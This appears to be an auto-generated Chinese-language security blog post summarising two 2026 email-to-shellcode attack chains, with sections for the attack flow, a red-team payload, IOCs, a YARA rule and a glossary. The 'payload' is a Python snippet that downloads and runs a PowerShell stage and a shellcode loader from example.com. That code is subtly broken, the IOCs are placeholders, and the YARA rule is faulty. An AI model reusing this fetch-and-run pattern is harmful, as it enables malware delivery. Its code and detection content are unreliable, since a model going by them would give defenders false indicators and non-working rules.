---
layout: post
title:  "Real emails, hijacked payments: Two H1 2026 attack chains"
date:   2026-08-07 18:44:06 +0000
categories: [security]
severity: high
---

# 🔥 解析 2026 上半年兩個利用合法帳戶和區塊鏈數據的攻擊活動

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 8.5)
> * **受駭指標**: RCE (Remote Code Execution) 和 LPE (Local Privilege Escalation)
> * **關鍵技術**: JavaScript Dropper, PowerShell Stages, Shellcode Loader, Proxy 和 Browser Manipulation, Rust-compiled Clipboard Hijacker

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 攻擊者利用合法帳戶和區塊鏈數據來進行攻擊，利用 JavaScript Dropper 和 PowerShell Stages 來執行 Shellcode Loader，從而實現 Proxy 和 Browser Manipulation。
* **攻擊流程圖解**:
  1. 攻擊者利用合法帳戶發送電子郵件，包含惡意附件。
  2. 受害者開啟附件，觸發 JavaScript Dropper。
  3. JavaScript Dropper 下載和執行 PowerShell Stages。
  4. PowerShell Stages 下載和執行 Shellcode Loader。
  5. Shellcode Loader 修改 Proxy 和 Browser 設定。
* **受影響元件**: Windows 10, Windows Server 2019, Google Chrome, Mozilla Firefox

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要合法帳戶和區塊鏈數據。
* **Payload 建構邏輯**:

    ```
    
    python
    import os
    import subprocess
    
    # 下載和執行 PowerShell Stages
    powershell_url = "https://example.com/powershell_stage.ps1"
    subprocess.run(["powershell", "-ExecutionPolicy", "Bypass", "-File", powershell_url])
    
    # 下載和執行 Shellcode Loader
    shellcode_url = "https://example.com/shellcode_loader.exe"
    subprocess.run(["cmd", "/c", shellcode_url])
    
    ```
* **繞過技術**: 攻擊者可以利用合法帳戶和區塊鏈數據來繞過安全防護。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | C:\Windows\Temp\malware.exe |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule malware_detection {
      meta:
        description = "Malware Detection"
        author = "Blue Team"
      strings:
        $a = "malware.exe"
      condition:
        $a at pe.entry_point
    }
    
    ```
* **緩解措施**: 更新系統和應用程序，啟用安全防護，監控系統和網絡活動。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **JavaScript Dropper**: 一種惡意程式，利用 JavaScript 下載和執行其他惡意程式。
* **PowerShell Stages**: 一種惡意程式，利用 PowerShell 下載和執行其他惡意程式。
* **Shellcode Loader**: 一種惡意程式，利用 Shellcode 修改系統設定。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/real-emails-hijacked-payments-two-h1-2026-attack-chains/)
- [MITRE ATT&CK](https://attack.mitre.org/)


